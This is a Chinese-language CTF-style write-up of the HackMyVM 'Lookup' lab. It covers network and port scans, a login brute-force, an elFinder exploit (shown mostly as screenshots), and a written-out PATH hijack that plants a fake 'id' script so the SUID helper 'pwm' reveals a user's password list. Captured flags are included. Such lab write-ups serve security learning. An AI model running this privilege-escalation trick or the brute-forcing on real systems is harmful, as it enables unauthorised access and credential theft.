---
title: hackmyvm Lookup靶机复盘
author: LingMj
data: 2025-02-02
categories: [hackmyvm]
tags: [id,upload,elFinder,look,PATH]
description: 难度-Medium
---

## 网段扫描
```
root@LingMj:/home/lingmj# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.56.110
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:14       (Unknown: locally administered)
192.168.56.100  08:00:27:68:6f:b7       (Unknown)
192.168.56.126  08:00:27:27:9b:80       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.861 seconds (137.56 hosts/sec). 3 responded
```

## 端口扫描

```
root@LingMj:/home/lingmj# nmap -p- -sC -sV 192.168.56.126
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 09:38 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.126
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.hmv
MAC Address: 08:00:27:27:9B:80 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.94 seconds
```

## 获取webshell

>出现域名lookup.hmv
>

![图 0](../assets/images/28cdea0a03b297fc71dde4989c0377e4a0c51a59006ef2dc660ffbbaac8c5488.png)  

>加了域名一样无法操作，判断存在子域名
>

![图 1](../assets/images/9f7d9f3c3074d110ab78379fa81323b04e8a46d43c2bbd5132bace2f48baac6d.png)  
![图 2](../assets/images/df1be386eb7f657b8d0b37669cb06d88bebbcc154ee6b7cbaac8a9f55aa8f510.png)  

>单纯谷歌问题，没事还有火狐能用，存在账号密码进行爆破处理
>
![图 3](../assets/images/7f579c448dd05a56a7519bd7f02743d0fd23b11ffd521574689e6dc90172909a.png)  

![图 4](../assets/images/ecc0e7089bc8337e2609c0d46c1623fcd73476456f9bd6647f3ececbd0049333.png)  
![图 6](../assets/images/6e8a363bdd81784a594744e40285db3a343684658b139132d02328bb591ca819.png)  
![图 7](../assets/images/be509e6651da4bc37a823ae631f9bb25f972c4bcef157685b7579eed97a636c6.png)  
![图 8](../assets/images/3cadc72a453262bc6bca2b78de7bb02f841e90ca3fee23e1f49824bc0f088f15.png)  

>无子域名，进行密码继续爆破
>
 
![图 9](../assets/images/89f515328432eab1b8e12ad08f5f55b8b599b8388a0c88ac6cf493d3f7945314.png)  

>这个爆破写错，看看是不是其他问题，手动测试常见的弱密码
>
![图 10](../assets/images/eadf16319338b6ed4cdfc2cc895b736f1cb3caff7f518f4b00d1f1532b98776c.png)  

![图 11](../assets/images/f3b7540b995e30e8ca4c64135c9658536baff48bd77587d8e4da101832998082.png)  

![图 12](../assets/images/0420a40d1567d00b1c2c7bcc0e13ef37c5be5fdc1de17942f8761c8f5f956936.png)  


>发现端倪，好像是密码对了判断用户，密码错了判断密码
>

![图 14](../assets/images/3067433025885b7a5df5b0fb63d364b8c983e506f2bc863a2004767b8126f97d.png)  

![图 13](../assets/images/f31230ff11bfa6ba6eeca96b9d39de9cc0100a8aaeaba86015ff7cc90480d951.png)  

![图 15](../assets/images/c1bbc5d7947e37e90e4c1608dc6f9b92fbc1ad7c5305b1e7f1c674e238dea20e.png)  
![图 16](../assets/images/1426d3c7eb5e0d6af591df0e6348e8d712fb2d89813544de66f3a5fb73cb9002.png)  
![图 17](../assets/images/afd0f9b692ddd8e846d61cff1b29abb183355849de94fa9bf82129cede2c8a1f.png)  
![图 18](../assets/images/1f8552de1f56cfe063b358240c058fce260092877860d490aedb25206cb6b5fb.png)  
![图 19](../assets/images/4d6ad18f2d8aedd6968c73c4ffc77e1d8b0780ad518681b71c2735caefb07b06.png)  
![图 20](../assets/images/766fe597ce5168774fd92d3e937f4daad0d5d37b5a771a129b2a686ec414c5f6.png)  
![图 21](../assets/images/f8c9af752c2af613af8c96fbe8ceb530ffb559084f9f844558990b5174e8af30.png)  
![图 22](../assets/images/82b106745be83d9d90d127ba49c1b39e80d6de0cd1925f2c2a9032f8bf12f68f.png)  
![图 23](../assets/images/2745f2a06775a1f39bb82b4f12c15b71618aba8c24dbea77c67dc4829905d3d3.png)  
![图 24](../assets/images/44e38a974b6c4a256654d3b8fdd5988438858bdb8ff61fffc4e8f753504fa316.png)  
![图 25](../assets/images/f9178118ff2f1f748d372923b9b3527474bf8e8de053557e27b4a778cc8f28bb.png)  

![图 26](../assets/images/e227f1f2b2466cb592f55d5bf1d703469f813675d6a271f9d8388482029ea189.png)  

>把txt全部拿出来爆破
>

![图 27](../assets/images/472ae834783d17b99cdf0433dc9f1f8d8aaeefb410b6508568a7cf9fb20c7fed.png)  

>如果不成功可以尝试创建压缩包解压看看
>

![图 28](../assets/images/7e16cda83169f21e1d2292be8648eec1de7c706e5c67ef0901db3381ccb729bc.png)  

>目前看爆破无果，看看有啥可以利用
>

![图 29](../assets/images/a0d2a8b0ddbf25502bfc8a1baf087c8bdf940336d41b9dd859b5b7670cd6e1cf.png)  

>主要还是图像，开一下msf有啥图像利用
>
![图 30](../assets/images/834c6f025f1eb0497cce42b4b8628f76c253d40f8d9466c90ea6e9db74a46926.png)  

>除了php，上面的都可以查一下
>
![图 31](../assets/images/ada73033c6529f1a7ba2bac808444787bbaf83353673f73f0cd2e508a0fffaee.png)  
![图 32](../assets/images/0fbf4d5ce1635b506021cac81c36350b1ff3bfd79f9eb0ed788312fe8e037f7d.png)  

>上面是wordpress，怕是不一定成功
>
![图 33](../assets/images/5be16adcf32d2371e10ea82203c876bac8a726ae2fdf3ac93558b74531baa4cf.png)  
![图 34](../assets/images/699c80fb45e0466d245531cecdb9f244c4d43a2b2a77c4ef3bf42d3dcfcb0cfa.png)  
![图 35](../assets/images/f9f62699a2220ff8a8e6511111aae7b7eb64f03b1a41f28678281647bf3150a0.png)  
![图 36](../assets/images/9d03da7a3c2fd18a6761fbaa3edee67e34bd905431137b073477cc929f945fdf.png)  
![图 37](../assets/images/f67722184614e02513b16f1960f2f1590ece1d71209493c574ff1997a96252ac.png)  

>有点傻逼了，忘记看版本和系统了
>
![图 38](../assets/images/461474e39b1ecdaf5569a501eb1a98c2451a8a6cf59e38650ef8b4ae59a3c12e.png)  

![图 39](../assets/images/ea6fca15ead52ae17638a10c7cfc48f5b64993c7ec7725af7f9ac777b99184a4.png)  
![图 40](../assets/images/4418c728f7497e47f28c5a397586069348835041034bf572bfe23589346545d9.png)  
![图 41](../assets/images/5b141c00f8800267d6ff575b51cb2498c16b9a622d0f2596dff44edfebb9bafd.png)  

>不容易啊，终于拿到了
>
![图 42](../assets/images/eca720601ad6751147ad9adcdd9c1c4ac759e53d21cac649b5881bcc1c8614c1.png)  




## 提权
![图 43](../assets/images/6e2cc9b23df22bd8d995277c3a77f5fe7b4da3fb3c6742342fd9d52617057748.png) 
![图 45](../assets/images/6e15a7d1547901ce62e0e490c2d4803f51cc9a10322174d4392ac06d52d02b2b.png)  

![图 44](../assets/images/93bb51e00e8fbd07f5068708f80a4dd644133e8da590c01912845f4f417d628c.png)  

>竟然不是密码
>

![图 46](../assets/images/573356cccd172f7e0e90139e16e2ca59b96df1e9c14dab244581a6fc34b51e2d.png)  
![图 47](../assets/images/08b5ad720ce8bd925d97b50f9b46c52aff2e5d60753fecec21d4958024865525.png)  


```
d--x--x--x 8 www-data www-data 4096 Apr  2  2024 elFinder
-rw-r--r-- 1 root     root      706 Apr  2  2024 index.php
www-data@lookup:/var/www/files.lookup.hmv/public_html$ cat index.php 
<?php
// Check if the "login_status" cookie is set and has the value "success"
if (isset($_COOKIE['login_status']) && $_COOKIE['login_status'] === 'success') {
    // Successful login - Redirect to a page in the files subdomain
    header('Location: http://files.lookup.hmv/elFinder/elfinder.html'); // Change 'http://files.lookup.hmv/destination-page' to the appropriate URL
    exit();
} else {
    // Cookie for successful login not found - Redirect to the page where the request came from
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'http://lookup.hmv'; // Set a default page to redirect if no referer is available
    header('Location: ' . $referer);
    exit();
}
?>

www-data@lookup:/var/www/files.lookup.hmv/public_html$ cd elFinder/
www-data@lookup:/var/www/files.lookup.hmv/public_html/elFinder$ ls -al
ls: cannot open directory '.': Permission denied
www-data@lookup:/var/www/files.lookup.hmv/public_html/elFinder$ ls
ls: cannot open directory '.': Permission denied
www-data@lookup:/var/www/files.lookup.hmv/public_html/elFinder$ 
```

>无法打开什么东西，需要改权限，先跑工具把
>

![图 48](../assets/images/be22b2209cdf125e67d5f267b5db9d0b874980a4953d7e2f0f893d78bde21c91.png)  

![图 49](../assets/images/1282ea6e6c30e5d68276527ec4fbd96b674249e14fe54b081feb5e59e9f121b7.png)  
![图 50](../assets/images/1cb5d179aac0808ec2c65eb572f9fd9844aa4afcee1c32a255339352e0dbf969.png)  

>这里我已经没思路了，去看wp说明id环境劫持
>
![图 51](../assets/images/042e30df2f54945aac738d5772e7118cae88f76c5e4e27f7802e58a37547e22e.png)  



```
www-data@lookup:/tmp$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
www-data@lookup:/tmp$ id think
uid=1000(think) gid=1000(think) groups=1000(think)
www-data@lookup:/tmp$ echo 'uid=1000(think) gid=1000(think) groups=1000(think)' > id
www-data@lookup:/tmp$ PATH=$PWD:$PATH
www-data@lookup:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@lookup:/tmp$ PATH=$PWD:$chmod +x id
+x: command not found
www-data@lookup:/tmp$ chmod +x id
www-data@lookup:/tmp$ PATH=$PWD:$PATH
www-data@lookup:/tmp$ /usr/bin/pwd
/tmp
www-data@lookup:/tmp$ /usr/sbin/pwm 
[!] Running 'id' command to extract the username and user ID (UID)
/tmp/id: 1: Syntax error: "(" unexpected
[-] Error reading username from id command
: Success
www-data@lookup:/tmp$ /usr/sbin/pwm 
[!] Running 'id' command to extract the username and user ID (UID)
/tmp/id: 1: Syntax error: "(" unexpected
[-] Error reading username from id command
: Success
www-data@lookup:/tmp$ echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' > id
www-data@lookup:/tmp$ /usr/sbin/pwm 
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

>像是密码，爆破一下
>

![图 52](../assets/images/a12dcbdcc36ba33c359aedd695cb927f01a59c84a56bc0ca07ce1a8fee79bf19.png)  
![图 53](../assets/images/dcef4d5d07a63537d4ca0409a69d9ac27fddaf41fa1e51e6f2e3282433c29910.png)  

>这个提示很明显，其实不用爆破
>

![图 54](../assets/images/f65a45b1f875fda722f4d6a42043401c0ac2ad08502dc455eb1559590ef50d5f.png)  

>读文件的话直接读id_rsa了
>
![图 55](../assets/images/6f3be08aa807691e5f08346c870a874103520ed139b4f34e1e4135202acc8cb8.png)  
![图 56](../assets/images/607dbbf9e2f718079a8a77319a6b9402febe140eeba8762c44a0dd8fec33e4ad.png)  
![图 57](../assets/images/758a0a0dd2ba53d01565c415aec2ba00cf77a90cd09cfb759e0c15b691d20aac.png)  

>结束除了user卡了一下
>



>userflag:38375fb4dd8baa2b2039ac03d92b820e
>
>rootflag:5a285a9f257e45c68bb6c9f9f57d18e8
>